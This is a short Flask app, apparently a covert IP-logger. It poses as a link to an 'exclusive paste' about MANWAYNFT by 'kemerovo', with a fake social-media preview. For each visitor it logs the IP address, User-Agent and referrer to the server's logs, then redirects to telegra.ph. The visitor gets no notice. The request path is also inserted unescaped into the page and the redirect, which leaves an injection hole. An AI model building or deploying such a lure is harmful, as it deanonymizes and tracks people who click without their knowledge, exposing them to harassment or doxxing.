from flask import Flask, request

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def track_and_redirect(path):
    # === СБОР ДАННЫХ ===
    real_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referer = request.headers.get('Referer', 'Direct')
    
    # Выводим в логи (это увидишь в Render → Logs)
    print(f"\n[+] НОВЫЙ ПОСЕТИТЕЛЬ!")
    print(f"    IP: {real_ip}")
    print(f"    User-Agent: {user_agent}")
    print(f"    Referer: {referer}")
    print(f"    Path: /{path}\n")

    # === РЕДИРЕКТ + ПРЕВЬЮ ===
    target_url = f"https://telegra.ph/{path}" if path else "https://telegra.ph"
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <title>ПАСТА НА MANWAYNFT by kemerovo</title>
        <meta name="description" content="Эксклюзивная паста от kemerovo. Только для избранных.">
        <meta property="og:title" content="ПАСТА НА MANWAYNFT by kemerovo" />
        <meta property="og:description" content="Эксклюзивная паста от kemerovo. Только для избранных." />
        <meta property="og:image" content="https://i.imgur.com/5KbQq9L.png" />
        <meta http-equiv="refresh" content="1;url={target_url}">
        <style>
            body {{
                display: flex; justify-content: center; align-items: center;
                height: 100vh; margin: 0; background: #000; color: #0f0;
                font-family: monospace; font-size: 24px; text-align: center;
            }}
        </style>
    </head>
    <body>
        ПАСТА НА MANWAYNFT by kemerovo<br>
        <span style="font-size:14px; color:#0a0;">Загрузка...</span>
    </body>
    </html>
    '''
